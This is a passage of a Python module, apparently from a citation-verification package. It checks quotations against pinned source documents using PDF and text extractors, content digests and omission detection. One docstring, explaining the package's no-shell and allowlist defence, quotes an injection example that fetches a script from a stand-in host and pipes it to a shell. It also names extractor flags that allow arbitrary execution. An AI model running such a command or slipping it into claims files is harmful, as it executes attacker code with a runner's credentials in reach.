"""Does each quotation appear in the source it cites?

Builds a corpus of quotations checked against a pinned source, so later work quotes from the
corpus rather than from memory.

Three orthogonal things, kept apart.

The pin -- is this the document that was pinned? Checked once per artifact:

    ok           the file's sha256 matches the one recorded
    broken       the file has changed since the quotations were taken
    unpinned     no sha256 was recorded, so nothing can be checked
    missing      the file named by the record is not on disk

A source missing at the path its record names is looked for once more, in the library's
`pdfs/` under the same filename, and read from there only where its bytes match the recorded
sha256. See `library_copy`.

The result -- did the passage appear? Exhaustive, four outcomes:

    found          the passage is in the source
    not found      the source was read and the passage is not in it
    indeterminate  extractors that both read the source disagree about whether it is in it
    unchecked      nothing could read the source, so no measurement was made

The warnings -- is the quote well formed? A quote can be `found` and still carry one:

    short        the source may qualify it in the next clause
    truncated    every occurrence stops mid-word or mid-number
    normalized   matched only after ignoring punctuation and spacing
    page         found, but not on the page the record claims

The extractor -- what turned the source into text? Recorded on every result, with a digest of
what it produced. A pin says the bytes did not change and says nothing about how they were
read: two extractors over one PDF produce two texts and one pin, so a decision that does not
name the program behind it cannot be compared with a later one. A source declaring
`extract_cmd` is read by the command it names, a source declaring a built-in `extractor` by that
extractor, a `TEXT_SUFFIXES` source straight off disk, a workbook or a `.docx` by the built-in
extractor its suffix names, and everything else by `pdftotext -layout` or, where poppler is
absent or fails on the document, by whichever pure-Python reader is installed. That substitution is recorded on the result as a
fallback and its reason: `pip install citations` should be able to check a PDF, and a result
that quietly rests on a different extractor than the one it names is worse than no result.

A declared command does not join that chain. An author naming a renderer has said which
program produces the text they quote, so it runs or the check is `unchecked` with its reason;
falling through to a PDF reader would run one over a source whose author just said is not a
PDF, and record an extractor nobody asked for.

The reading -- is the text the extractor produces the text that was quoted? A source may record
`derived_sha256`, the digest of what its declared reading produced when the quotations were
pinned. The pin cannot answer this: an extractor that changed turns the same bytes into other
text under an unbroken pin. Checked once per source, reported beside the broken pins, and a
failure for the same reason one of those is.

A `not found` whose every word is in the source says so. Where the quotation is two or more
stretches of the source, in the source's order, with source text left out between them and
nothing marking the gap, the result carries `reason = "omission"`, one `Gap` for each place
text was left out with the text itself, and `passage`, the quotation as the source has it. It stays `not found`: a quotation is one stretch of the source, and the
words left out may be the ones that qualify it. See `omission` for the rule.

`indeterminate` is not a milder `not found`. `not found` says the source was read and the
passage is not in it, which is an accusation against the manuscript. `indeterminate` says the
extractors on this machine do not settle what text the document holds, which accuses nothing
and asks for a better reader. Against the three-stage model in `docs/SPEC.md` the two sit in
different stages: `not found` is `extraction=extracted, comparison=mismatch`, while
`indeterminate` is `extraction=invalid, comparison=not_applicable` -- the extractors ran, and
what they produced does not determine a text to compare against. It is reached only under
`--triangulate`, which asks every installed reader instead of one; a single extractor cannot
disagree with itself, and a declared command is a single extractor.

`unchecked` means read the source. A mirror-reversed scan or a broken extraction produces the
same signal as a passage that was never there -- so an extraction that failed for an
infrastructure reason says which one, rather than reporting the document as unreadable.

Running a declared `extract_cmd`
--------------------------------

The command a claims file declares runs on the machine doing the checking. The case that
decides the rules is not an author running their own file: it is `citations verify` in
continuous integration on a pull request from a fork, where the contributor wrote the claims
file and the command executes on the maintainer's runner with the runner's environment and
credentials in reach. Two measures bound that, and neither is a sanitizer:

    no shell     the declared string is split into a program and arguments and executed
                 directly. `pdftotext x; curl evil.sh | sh` is not filtered out, it cannot be
                 expressed -- the `;` and the `|` reach pdftotext as literal arguments.
    an allowlist only `DEFAULT_EXTRACTORS` runs unasked. Anything else needs
                 `--allow-extractor NAME`, written by whoever runs the check rather than by
                 whoever wrote the claims file.

A refused command is `unchecked` and says it was refused; a command that is not installed is
`unchecked` and says that instead. The remedy for one is consent and for the other an install,
and neither makes the passage absent.

The allowlist bounds which program runs and not what an allowed program can be told to do, so
a program that loads and runs code named on its own command line stays out of the default set.
`pandoc --lua-filter` and `mutool run` are both arbitrary execution, and reaching either is a
deliberate act with the consequence in view.
"""

from __future__ import annotations

import functools
import hashlib
import itertools
import os
import pathlib
import re
import shlex
import shutil
import subprocess
import unicodedata
from collections.abc import Callable
from dataclasses import dataclass, field
from typing import Literal

from provenance_core import sha256_of_file

from citations import extraction_cache, extractors, readers
from citations.exceptions import SourceUnreadableError

# Long enough to carry its own qualifiers. "We trained 50" resolves against a sentence that
# continues "...and 5 refits each for 12 layered".
MIN_QUOTE_CHARS = 40

#: The shortest stretch of a quotation that counts as a piece of the source when `omission`
#: asks whether a quotation is the source with text left out. Half of `MIN_QUOTE_CHARS`, about
#: four words: below it nearly any sentence can be assembled from fragments some long document
#: holds in order, and a changed word is reported as an omission wherever the source uses that
#: word later on. The minimum makes that rare; `omission` says what is left of it.
MIN_PIECE_CHARS = 20

#: The longest `prefix` or `suffix` `single_out` will return, in folded characters. Anchors are
#: written into a claims file, and a passage inside blocks that repeat in full is singled out
#: only by text reaching to where a block ends: on a 1.1 MB source of repeated blocks that was
#: two anchors of 553,000 characters each. Past this the answer is a refusal that says so.
MAX_ANCHOR_CHARS = 1000

#: How many ways of fitting a quotation to its source `omission` will list before it stops
#: counting. Each is a division into pieces and a place for each piece, and a source that
#: repeats a phrase a hundred times has that many for every piece. Past this the shortest of
#: the ones listed is reported, `Omission.capped` is set, and nothing is called unique.
MAX_FITTINGS = 1000

#: `Result.reason` on a `not found` whose pieces are all in the source. See `omission`.
OMISSION = "omission"

#: How many pages `_find_page` will scan before giving up. Hitting it is reported, never
#: silently folded into "not found on any page" -- the two are different facts.
PAGE_SCAN_LIMIT = 200

#: Suffixes read directly rather than through a PDF extractor. Running `pdftotext` over these
#: returns nothing, which would read as an unreadable source.
TEXT_SUFFIXES = (".txt", ".md", ".tei", ".xml", ".html", ".htm", ".rst", ".py")

#: Recorded as the extractor for a source read straight off disk. Naming a program there would
#: claim one ran.
PLAIN_TEXT = "text"

#: What reads a source that declares no `extract_cmd` and is not plain text, where poppler is
#: installed and can read it. Also the name the report gives that reading.
DEFAULT_EXTRACTOR = "pdftotext -layout"

#: The obvious reader for a format, where there is one, keyed by suffix. A `.pdf` has always
#: had this; a `.tex` did not, so a LaTeX manuscript reached `pdftotext`, answered `Syntax
#: Error: Couldn't read xref table`, and every quotation in it graded `unchecked` until the
#: author declared `detex` by hand. Both entries are the same rule -- the reader a format
#: obviously wants, chosen when nothing was declared, named on the result, and overridden by
#: declaring one. Every value here must be in `DEFAULT_EXTRACTORS`: the undeclared path is not
#: given the caller's allowlist -- by design, so that a source declaring nothing does not begin
#: consulting it -- so an entry naming anything else would grant consent the caller never gave.
#: `test_the_suffix_can_only_choose_a_reader_that_runs_unasked` holds that.
BY_SUFFIX: dict[str, str] = {".tex": "detex", ".latex": "detex"}

#: The same binary with `-layout` removed, so it emits poppler's reading order rather than the
#: page's geometry. Not in the chain: `-layout` always reads a PDF poppler can open, so nothing
#: would ever reach this. It is a triangulation participant, because the two modes fail in
#: opposite directions -- `-layout` preserves visual position and breaks a sentence spanning
#: two columns, reading order preserves the sentence and misplaces the subscripts beside it.
#: Measured over 1,593 passage checks in `research/pdf-readers/`: reading order resolved 59 the
#: layout mode missed and missed 29 it resolved, so neither is preferred and both are read.
READING_ORDER = "pdftotext"

#: Recorded as the extractor when a caller replaced `extract`. Naming the substitution keeps
#: the promise the rest of this module makes: a result says what produced the text it was
#: checked against, and "a stub did" is an answer where inventing an extractor name is not.
SUBSTITUTED = "substituted"

#: The word a claims file uses to say "this source needs no extractor".
#: `paperclip.source_block` writes it for a pinned text artifact, on the reasoning that naming
#: an extractor would claim a step that never ran -- and `_argv` then read it as a program
#: called `none` and refused it, so every source the resolver wrote came back `unchecked`,
#: advising the reader to `--allow-extractor none` and run a program that does not exist.
NO_EXTRACTOR = "none"


def declared_extractor(extract_cmd: str | None) -> str | None:
    """The command a source declares, or None where it declares that it needs none.

    Applied wherever an `extract_cmd` arrives from a file, so the rest of the module sees one
    representation of "no extractor" rather than several.

    Matched on the first word, because authors write the reason beside it -- `none -- Markdown
    is read directly` is in this project's own claim set, and reading that as a command named
    `none` is how it was found. Nothing is guessed from the rest of the line: a value whose
    first word is anything else is a command, and is run or refused as one. A real program
    named `none` would be read as this declaration instead, which is the one case this trades
    away and it does not occur.
    """
    if extract_cmd is None or not (words := extract_cmd.split()):
        return None
    return None if words[0].strip().lower() == NO_EXTRACTOR else extract_cmd


#: A declared `cat` given nothing but the source. It names no rendering, only the bytes on disk,
#: which this module reads itself for a text file. Read here rather than run, so it needs no
#: consent: it was refused as a program outside `DEFAULT_EXTRACTORS`, and 23 quotations on one
#: public site were `unchecked` for asking for the file as it is. `cat -n {}` and `cat other {}`
#: are commands, and are run or refused as any other.
READ_AS_IS = (["cat"], ["cat", "{}"])


def reads_as_is(extract_cmd: str | None) -> bool:
    try:
        return extract_cmd is not None and shlex.split(extract_cmd) in READ_AS_IS
    except ValueError:
        return False


#: How long any extractor gets before the source is reported unreadable rather than waited on.
EXTRACT_TIMEOUT = 120

#: Programs an `extract_cmd` may name with no further consent. Each reads a file and prints
#: text, and neither can be told on its own command line to load and run code. Matched against
#: the program as written, so `pdftotext` is allowed and `./pdftotext` is not: a bare name
#: resolves through PATH, which the machine running the check controls and a claims file
#: arriving from elsewhere does not.
DEFAULT_EXTRACTORS = frozenset({"pdftotext", "detex"})

State = Literal["found", "not found", "ambiguous", "indeterminate", "unchecked"]
PinState = Literal["ok", "broken", "unpinned", "missing"]


@dataclass(frozen=True)
class Gap:
    """One place a quotation leaves source text out without marking it."""

    at: int
    """Where the gap falls in the quotation: the folded characters before it."""
    skipped: int
    """Folded characters of the source left out there: the whole tokens between the piece
    before the gap and the piece after, without the space on either side."""
    text: str = ""
    """The source text left out there, in full. See `Omission.folded` for whose characters."""
    offset: int = 0
    """Where `text` begins in `Omission.passage`."""
    tokens: int = 0
    """How many tokens of the source are left out there. A token is what `omission` says it
    is, and this is the one count of them: `citations restore` holds it to its limit and
    writes it down."""
    position: int = 0
    """The place of the first of those tokens among the passage's tokens, counting from 1."""


@dataclass(frozen=True)
class Omission:
    """A quotation that is the source with text left out: what was left out, and what is there."""

    gaps: list[Gap]
    passage: str
    """The source from the start of the quotation's first piece to the end of its last, gaps
    included: the quotation as the source has it."""
    start: int = -1
    """Where `passage` begins in the text the source was read as, in characters. -1 where
    `folded`, since the folded text has no place in it."""
    folded: bool = False
    """Whether `passage` and each `Gap.text` are the folded text, in lower case with single
    spaces, and not the source's own characters. They are the source's own wherever a stretch
    of the source can be found that folds to exactly the stretch that matched, which
    `_stretch` looks for and checks. Where it cannot, the folded text is shown and this says so."""
    fittings: int = 1
    """In how many ways the quotation fits the source as pieces. This is the one with the
    shortest passage."""
    capped: bool = False
    """Whether the count stopped at `MAX_FITTINGS`, so there may be more and a shorter one
    among them."""
    unique: bool = False
    """Whether every other way of fitting the quotation spans a passage that contains this
    one and is longer. It says the passage is the shortest and sits inside all the others. It
    does not say the quotation was taken from it: a containing way can be another reading.
    False where two ways span the same passage, where neither of two passages contains the
    other, and where the count was capped."""


@dataclass
class Result:
    """`state` is the measurement; `warnings` are notes about the quote itself."""

    state: State
    detail: str = ""  # why, when unchecked or not found
    warnings: list[str] = field(default_factory=list)
    page_found: int | None = None

    extractor: str = ""
    """What turned the source into text: the declared `extract_cmd`, `pdftotext -layout`, or
    `text` for a source read straight off disk. Empty where nothing was read, so a decision
    resting on an extractor stays distinguishable from one that rests on none."""

    extraction_digest: str = ""
    """sha256 of the text the extractor produced. The artifact's pin establishes that the
    bytes did not change; this establishes that the reading of them did not, which a pin
    cannot -- two extractors over one PDF produce two texts under one pin."""

    fallback: bool = False
    """Whether something other than `pdftotext -layout` produced this text on a source that
    declared no command. A substitution is recorded, never silent: a `not found` taken with
    pypdf is a different record from one taken with poppler."""

    fallback_reason: str = ""
    """Why poppler did not produce it -- not installed, or failed on this file."""

    reason: str = ""
    """`omission` on a `not found` whose every word is in the source, as pieces in the source's
    order with text left out between them. Empty on every other result."""

    gaps: list[Gap] = field(default_factory=list)
    """Where that quotation leaves source text out, in order, each with the text left out.
    Empty unless `reason` is set."""

    passage: str = ""
    """The quotation as the source has it, gaps included. Empty unless `reason` is set."""

    passage_folded: bool = False
    """`Omission.folded` for `passage` and the gaps' text."""

    agreement: dict[str, State] = field(default_factory=dict)
    """Each extractor's own verdict, when more than one was consulted. Empty on the default
    single-extractor check: an empty mapping means agreement was never measured, not that the
    extractors agreed. Availability and agreement are different questions and this field
    answers only the second."""


@dataclass
class Pin:
    """Whether the artifact on disk is the artifact the record describes.

    Separate from `Result` because it is a fact about the source, not about any one quotation.
    A broken pin does not make a quotation `not found` -- the passage may well be in the file
    that is there -- but it does mean every result computed against it describes a document
    the record does not.
    """

    state: PinState
    expected: str = ""
    actual: str = ""

    @property
    def ok(self) -> bool:
        return self.state == "ok"


@dataclass
class Report:
    checked: int = 0
    counts: dict[str, int] = field(default_factory=dict)
    problems: list[tuple[str, str, Result]] = field(default_factory=list)
    broken_pins: list[tuple[str, Pin]] = field(default_factory=list)
    changed_readings: list[tuple[str, Pin]] = field(default_factory=list)
    """Sources whose declared reading no longer produces the text recorded as
    `derived_sha256`. The bytes match their pin and the extractor turns them into other text
    than was quoted, so every result against that source describes a reading the record
    does not."""
    unpinned: list[str] = field(default_factory=list)
    """Sources with no recorded digest. Their quotations resolve against whatever is on disk."""
    from_library: list[tuple[str, pathlib.Path]] = field(default_factory=list)
    """Sources absent at the path their record names and read from the library instead, with
    the file that was read. Each matched its pin, or it would not be here. Reported so the
    counts above say where their bytes came from: the same claims directory resolves on the
    machine holding the library and is `unchecked` on one that does not."""
    skipped: list[tuple[str, str]] = field(default_factory=list)
    """Claims files that would not parse, so their quotations were never examined."""
    extractors: dict[str, int] = field(default_factory=dict)
    """How many quotations each extractor answered. A report that does not say what read its
    sources cannot be compared with one taken where a different renderer was declared."""

    fallback_reasons: dict[str, str] = field(default_factory=dict)
    """Why poppler did not answer, for each extractor that stood in for it. A fallback appears
    here whether it was taken because poppler was absent or because poppler failed, so no
    substitution is invisible in the report."""

    interpretations: int = 0
    """Claims carrying an `interpretation` block. Counted, never checked.

    A characterization is not the kind of thing this package measures, and reporting the
    count beside the quotation results is how a clean run stops reading as an endorsement of
    them. A run that resolves every quotation has said nothing about whether any statement
    follows from what it resolved.
    """

    foreign_readings: int = 0
    """Interpretations whose `whose` is neither `ours` nor the source's own citation key.

    These are the ones worth a reader's attention: a characterization attributed to a third
    document is a claim about what someone else took the source to mean, and the source
    cannot corroborate it.
    """

    contested_readings: int = 0
    """Interpretations marked `contested`, which a file records rather than resolves."""

    restored: int = 0
    """Quotations written by `citations restore`: a passage of the source put back around
    text the original quotation left out. Counted apart from the rest, because each is the
    source's text and not what the quoting party wrote, and a total that mixed the two would
    say more quotations resolved as written than did."""

    triangulated: int = 0
    from_cache: int = 0
    """Extractions returned from the cache of earlier runs, each filed under the sha256 of the
    source's bytes and the version of the program that read them. Counted so a report says
    which of its readings no extractor produced in this run."""
    """Quotations more than one extractor was asked about. Counted rather than inferred from
    `--triangulate`: a run can ask for triangulation and get none, where every source declares
    a command or only one reader is installed, and reporting the request as the result would
    claim an agreement nothing measured."""

    @property
    def unresolved(self) -> int:
        """Quotations no verdict was reached on.

        `indeterminate` counts here and not among the failures. Extractors disagreeing about a
        passage leaves the question open in exactly the way an absent one does; what it does
        not do is assert that the passage is missing.
        """
        return (
            self.counts.get("unchecked", 0)
            + self.counts.get("indeterminate", 0)
            + self.counts.get("ambiguous", 0)
        )

    @property
    def strict_ok(self) -> bool:
        """What `--strict` means: nothing was left unresolved.

        `ok` is the substantive verdict -- a quotation that is genuinely absent. It
        deliberately ignores an unchecked quote, because a missing extractor says nothing
        about the paper. For CI that is the wrong question: a deleted source, an unpinned
        one, a claims file that would not parse, and a missing `pdftotext` all left a build
        green while nothing had been verified at all.
        """
        return self.ok and not self.unresolved and not self.unpinned and not self.skipped

    @property
    def ok(self) -> bool:
        """Only `not found`, a broken pin and a changed reading are failures. Unchecked and
        indeterminate are not.

        A run that measured nothing is not a pass, decided here so no caller can report
        success on an empty run. Two runs measure nothing. One has no quotations. The other
        has them and could read none of its sources -- a misdeclared `extract_cmd`, a
        `pdftotext` that is not installed, a directory of sources that moved -- and it is the
        one that looks like work. Both are refused here, so the exit code never says a
        corpus was established by a run that established nothing.

        `indeterminate` is deliberately not a failure. Two extractors disagreeing about a
        passage says the document is not determinate under the readers on this machine;
        treating that as a quotation failure would fail a manuscript for a property of the
        reader. `--strict` still refuses it, through `unresolved`.
        """
        if self.checked == 0:
            return False
        if self.unresolved >= self.checked:
            return False
        if self.broken_pins or self.changed_readings:
            return False
        return not any(r.state == "not found" for _, _, r in self.problems)


@functools.lru_cache(maxsize=256)
def passage_fold(s: str) -> str:
    """Normalize the way a PDF extractor mangles text, without changing which words appear."""
    # NFKD and not NFKC, then the combining marks dropped. A renderer typesets `naïve` as a
    # dotless i carrying a combining diaeresis, which is how LaTeX writes it, and the quotation
    # is typed with the precomposed `ï`. Composing leaves those two different strings and the
    # passage reads as absent: seven quotations from one paper failed on that alone. Dropping
    # the marks makes both sides `naive`, at the cost of no longer distinguishing two words
    # that differ only by an accent -- which is a pair that does not occur inside one document.
    # NFKD folds the `ﬁ` and `ﬂ` ligatures the same as NFKC does.
    #
    # The marks are found among the distinct characters of the text and deleted in one pass.
    # Asking `unicodedata.combining` of every character in turn was a third of a run over a
    # few hundred pages, and a text has a few hundred distinct characters.
    if not s.isascii():
        s = unicodedata.normalize("NFKD", s)
        if marks := [ord(c) for c in set(s) if unicodedata.combining(c)]:
            s = s.translate(dict.fromkeys(marks))
    # A PDF's embedded fonts can reach the extractor as raw glyph codes, arriving as control
    # characters mid-page. They become separators rather than being deleted: deleting them welds
    # the words on either side into one that appears in neither text, so a passage that is really
    # there stops resolving. `logit\x00difference` deleted is `logitdifference`, which no honest
    # quotation of it can match.
    s = re.sub(r"[\x00-\x08\x0b\x0e-\x1f\x7f]", " ", s)
    s = s.replace("’", "'").replace("‘", "'")
    s = s.replace("“", '"').replace("”", '"')
    # Em dash, en dash, minus sign, and U+2010 HYPHEN. The last is the one that gets missed:
    # it is visually identical to the ASCII hyphen and publishers emit it, so a source reading
    # `patients\u2010in\u2010waiting` did not match a quotation typed with the ASCII one, and the
    # passage read as absent from a document that contains it.
    s = s.replace("—", "-").replace("–", "-").replace("−", "-").replace("‐", "-")
    # Dotless i and dotted capital I are letters in their own right, not compatibility forms,
    # so no normalization reaches them: NFKC and NFKD both leave `ı` exactly as it was. A PDF
    # that renders `Krzyżosiak` through a font substituting the dotless glyph extracts a word
    # no honest quotation of it can match, and the passage reads as absent from a document
    # that contains it. The ligatures need no entry here -- NFKC folds `ﬁ` to `fi` already.
    s = s.replace("ı", "i").replace("İ", "I")
    s = re.sub(r"-\s*\n\s*", "", s)  # de-hyphenate across a line break
    return " ".join(s.split()).lower()


@functools.lru_cache(maxsize=256)
def skeleton(s: str) -> str:
    """`passage_fold`, with whitespace removed. Nothing else.

    This is the fallback used when a verbatim match fails, so it is only ever applied to a
    passage that is provably not in the source as written. It must therefore absorb exactly
    what a PDF extractor mangles and nothing more.

    Extractors insert and drop spaces inside words -- `logit difference` comes out as
    `logitdifference` -- so whitespace is removed. They do not turn `=` into `<`, delete a
    minus sign, or drop a decimal point. An earlier version stripped every non-alphanumeric
    character, which made `p < 0.05` match a source reading `p = 0.05`, and `-0.42` match
    `0.42`: a reversed inequality and a flipped sign both reported as quoted verbatim, by the
    one check that exists to catch a misquotation.
    """
    s = passage_fold(s)
    # A hyphen joining two word characters, at least one of them a letter, with any whitespace
    # after it. A renderer breaks `prefix-matching` across a line, `passage_fold` removes the break
    # hyphen from the document, and the quotation keeps the real one, so the two can never
    # agree while a hyphen means anything here. The trailing `\s*` is for the mirror case,
    # where the quotation preserved the break and the document did not: `non- sparse` against
    # `nonsparse`.
    #
    # The bounds are the point. Deleting every hyphen is a live defect -- it folds `-0.42`
    # into `0.42`, so a quotation claiming the negative resolves against a source stating the
    # positive -- and this is what stops that: a minus sign is preceded by a space or by
    # nothing, never by a word character, so no rule here reaches one. Nor does it reach the
    # subtraction in `vec('king') - vec('man')`, which is spaced on both sides and stays a
    # mismatch when a document's extraction has dropped it. Requiring a letter on one side
    # leaves `5-3` alone, where a range and a subtraction look identical.
    s = re.sub(r"(?<=[a-z])-\s*(?=[a-z0-9])|(?<=[a-z0-9])-\s*(?=[a-z])", "", s)
    # An underscore is a subscript the extractor has already flattened: `p_{IOI}` comes out as
    # `pioi`, and the quotation is typed with the underscore the source no longer shows.
    s = s.replace("_", "")
    return re.sub(r"\s+", "", s)


def _argv(source: pathlib.Path, declared: str, allowed: frozenset[str]) -> list[str]:
    """A declared `extract_cmd` as argv, with the source path substituted in.

    `{}` is replaced by the path wherever it appears, and a command carrying no `{}` gets the
    path appended, so `detex` and `pdftotext -layout {} -` both name a working extractor.

    Refuses a command that will not parse into a program and arguments, and one naming a
    program this run was not told to allow. Both raise `SourceUnreadableError`, so both reach
    the report as `unchecked` with the reason: nothing was read, and the passage is not
    thereby absent. The module docstring says why the check is an allowlist over argv rather
    than a filter over a string.
    """
    try:
        parts = shlex.split(declared)
    except ValueError as e:
        raise SourceUnreadableError(source, f"extract_cmd will not parse as a command: {e}") from e
    if not parts:
        raise SourceUnreadableError(source, "extract_cmd is empty")
    if parts[0] not in allowed:
        raise SourceUnreadableError(
            source,
            f"extract_cmd names {parts[0]!r}, which this run does not allow -- "
            f"pass --allow-extractor {parts[0]} to run it",
        )
    if any("{}" in part for part in parts):
        return [part.replace("{}", str(source)) for part in parts]
    return [*parts, str(source)]


def _stem_siblings(source: pathlib.Path) -> frozenset[str]:
    """Files beside `source` sharing its stem, which is where a writing extractor puts output.

    Narrowed to the stem rather than the whole directory on purpose. `pdftotext -layout X.pdf`
    writes `X.txt`, which is the observed case; watching every name in the directory would also
    fire when an unrelated process writes there, and this project routinely has more than one
    session working in one tree.
    """
    try:
        names = os.listdir(source.parent)
    except OSError:
        return frozenset()
    # A name begins with its stem, so the prefix test settles almost every entry of a folder
    # holding a few thousand sources without building a path for it.
    stem = source.stem
    return frozenset(
        name
        for name in names
        if name.startswith(stem) and name != source.name and pathlib.PurePath(name).stem == stem
    )


def _run(source: pathlib.Path, argv: list[str], missing: str = "", hint: str = "") -> str:
    """Run one extractor over `source` and return what it printed.

    Never through a shell: `subprocess.run` is handed a list, so a metacharacter in a declared
    command is an argument to the program rather than an operator interpreted before it.

    Every way the toolchain can fail raises `SourceUnreadableError` naming which way, rather
    than returning empty text. An empty return means the document holds no extractable text,
    which is a fact about the document and carries a different message.
    """
    program = argv[0]
    # The bytes before the command runs. A declared extractor is an arbitrary program given a
    # path, and nothing stops it writing where it read: a renderer whose output filename
    # matched its input overwrote the artifact it was pointed at, and the pin then failed
    # against a file the checker itself had damaged. Recovering it needed version control.
    # `verify` reads and never writes, so an extractor that writes is a defect to report.
    # `sha256_of_file` and not the memoized `sha256` beside it: the point is to read the
    # bytes twice and compare, and a cache keyed on the path returns the first answer both
    # times, which would make this check incapable of failing.
    before = sha256_of_file(source) if source.is_file() else ""
    # The same bytes read by the same version of the same program with the same arguments give
    # the same text, so that text is returned where an earlier run filed it. Nothing runs, so
    # there is nothing below to check. See `extraction_cache`.
    held_under = extraction_cache.address(before, argv, source)
    if held_under is not None and (held := extraction_cache.get(held_under)) is not None:
        return held
    # The same rule one level out. The hash above catches an extractor that overwrites the file
    # it was given; it cannot see one that writes a *sibling*, and that is the common shape:
    # `pdftotext -layout X.pdf` with no `-` writes `X.txt` and prints nothing. Thirty-two such
    # files accumulated in one audited repository over three weeks, unnoticed because the
    # directory is gitignored. Nothing was corrupted there, but a `.txt` pinned as a source
    # beside a same-stem PDF would have been silently replaced by this tool's own output.
    beside = _stem_siblings(source)
    try:
        proc = subprocess.run(argv, capture_output=True, text=True, timeout=EXTRACT_TIMEOUT)
    except FileNotFoundError as e:
        raise SourceUnreadableError(source, (missing or f"{program} is not on PATH") + hint) from e
    except subprocess.TimeoutExpired as e:
        raise SourceUnreadableError(source, f"{program} timed out after {EXTRACT_TIMEOUT}s") from e
    except OSError as e:
        raise SourceUnreadableError(source, f"{program} could not be run: {e}") from e
    if before and (after := sha256_of_file(source)) != before:
        raise SourceUnreadableError(
            source,
            f"{program} modified the artifact it was given ({before[:12]} -> {after[:12]}). "
            f"An extractor reads; one that writes has damaged the bytes the pin names, and "
            f"the file on disk is no longer the one that was checked. Restore it before "
            f"re-running. A command whose output path collides with its input does this: "
            f"give the output a distinct name, or write to stdout.",
        )
    if left := sorted(_stem_siblings(source) - beside):
        raise SourceUnreadableError(
            source,
            f"{program} wrote {', '.join(left)} beside the source. An extractor reads; one "
            f"that writes has changed the tree it was pointed at, and a file it leaves under "
            f"a name another record pins would replace that record's source with this tool's "
            f"own output. Send the text to stdout instead: `{program} ... {{}} -`. The file it "
            f"wrote is still there; nothing here deletes it.",
        )
    if proc.returncode != 0:
        said = (proc.stderr or "").strip().splitlines()
        raise SourceUnreadableError(
            source,
            f"{program} exited {proc.returncode}" + (f": {said[-1]}" if said else "") + hint,
        )
    if not proc.stdout.strip():
        # An empty stdout from a *declared* command is not the same fact as a document with no
        # text, and the two carried one message. `pdftotext FILE` writes FILE.txt and prints
        # nothing; a reader told "no text extracted" goes looking at the document.
        advice = (
            "  (pdftotext writes to a file unless the last argument is `-`: "
            "declare `pdftotext -layout {} -`)"
            if pathlib.Path(program).name == "pdftotext" and "-" not in argv[1:]
            else "  (the command ran and exited 0; its output goes to stdout, "
            "so a command that writes a file prints nothing here)"
        )
        raise SourceUnreadableError(source, f"{program} printed nothing" + advice + hint)
    if held_under is not None:
        extraction_cache.put(held_under, proc.stdout)
    return proc.stdout


def _hint(pdf: pathlib.Path) -> str:
    """What to say when a PDF reader was pointed at something that is not a PDF.

    Any non-PDF handed to one answers `Syntax Error: Couldn't read xref table`, which reads as a
    damaged document rather than as the wrong tool pointed at an intact one. `.tex` used to be
    the common case and now has its own reader in `BY_SUFFIX`, so this is reached for the
    formats that still have none.
    """
    if pdf.suffix.lower() in ("", ".pdf"):
        return ""
    return f"  ({pdf.suffix} is not a PDF: declare extract_cmd to name the renderer)"


def _poppler(pdf: pathlib.Path, page: int | None, layout: bool = True) -> str:
    """`pdftotext` over a source, or one page of it, with or without `-layout`."""
    cmd = ["pdftotext", "-layout"] if layout else ["pdftotext"]
    if page:
        cmd += ["-f", str(page), "-l", str(page)]
    cmd += [str(pdf), "-"]
    return _run(pdf, cmd, "pdftotext is not on PATH -- install poppler-utils")


def _chain(pdf: pathlib.Path, page: int | None) -> readers.Extraction:
    """The first extractor that reads this source, and what it took to get there.

    Poppler is attempted rather than looked up on PATH first. The two answers agree wherever
    it matters -- an absent binary raises `FileNotFoundError` when run -- and attempting it
    keeps one code path, so a caller that replaced `subprocess.run` sees the extractor it
    replaced rather than a chain that decided in advance not to call it.

    A reader that is not installed contributes its reason without being run, because its
    absence is an import-time fact and no attempt could tell us more. Every reason is kept:
    "nothing could read this" is only useful with what each of them said.
    """
    reasons: list[str] = []
    try:
        return readers.Extraction(_poppler(pdf, page), DEFAULT_EXTRACTOR)
    except SourceUnreadableError as e:
        reasons.append(e.detail)
    for name in readers.PREFERRED:
        try:
            text = readers.READERS[name].read(pdf, page)
        except SourceUnreadableError as e:
            reasons.append(e.detail)
            continue
        return readers.Extraction(text, name, fallback=True, fallback_reason="; ".join(reasons))
    raise SourceUnreadableError(pdf, "; ".join(reasons) + _hint(pdf))


#: What produced each extraction, keyed exactly as `extract` is keyed and holding no text.
#: `reading` reads it back to name the extractor without extracting a second time, and an
#: entry that is not here means `extract` was replaced by a caller -- the one case where the
#: text did not come from an extractor this module ran. Cleared with the cache beside it.
_PROVENANCE: dict[tuple, tuple[str, bool, str]] = {}


def _extract(
    pdf: pathlib.Path,
    page: int | None,
    extract_cmd: str | None,
    allowed: frozenset[str],
) -> readers.Extraction:
    """The extraction itself, and what produced it.

    A declared `extract_cmd` takes precedence over both other paths, including reading a
    `TEXT_SUFFIXES` file directly: an author names a renderer because the bytes on disk are
    not the text they quote. It renders the whole document at once, so `page` does not reach
    it, `allowed` decides which programs this run will run, and it never falls through to the
    chain -- a named renderer that failed is a fact to report, not a reason to run something
    else and record its name instead.

    A declaration naming a built-in extractor is read in this process and never reaches
    `allowed`. The allowlist bounds which programs a claims file can make this machine run,
    and a built-in extractor runs none: the file has named a reader this package ships.
    """
    if extract_cmd:
        if (builtin := extractors.declared(pdf, extract_cmd)) is not None:
            return readers.Extraction(builtin.read(pdf), builtin.name)
        if reads_as_is(extract_cmd):
            try:
                return readers.Extraction(pdf.read_text(errors="replace"), PLAIN_TEXT)
            except OSError as e:
                raise SourceUnreadableError(pdf, f"could not be read: {e}") from e
        argv = _argv(pdf, extract_cmd, allowed)
        return readers.Extraction(_run(pdf, argv), _extractor_name(pdf, extract_cmd))
    if (obvious := BY_SUFFIX.get(pdf.suffix.lower())) and obvious in allowed:
        # Chosen, not declared, so it is named on the result like any other reading. A format
        # whose reader is refused by `allowed` falls through rather than being forced: consent
        # to run a program comes from whoever invoked the command.
        return readers.Extraction(_run(pdf, _argv(pdf, obvious, allowed)), obvious)
    if (name := extractors.BY_SUFFIX.get(pdf.suffix.lower())) is not None:
        # The same rule for a workbook or a `.docx`, which had no reader at all: both reached
        # the PDF chain and every quotation in them was `unchecked`.
        chosen = extractors.Declared(extractors.EXTRACTORS[name])
        return readers.Extraction(chosen.read(pdf), chosen.name)
    if pdf.suffix.lower() in TEXT_SUFFIXES:
        try:
            return readers.Extraction(pdf.read_text(errors="replace"), PLAIN_TEXT)
        except OSError as e:
            raise SourceUnreadableError(pdf, f"could not be read: {e}") from e
    return _chain(pdf, page)


@functools.lru_cache(maxsize=64)
def _extraction(
    pdf: pathlib.Path,
    page: int | None,
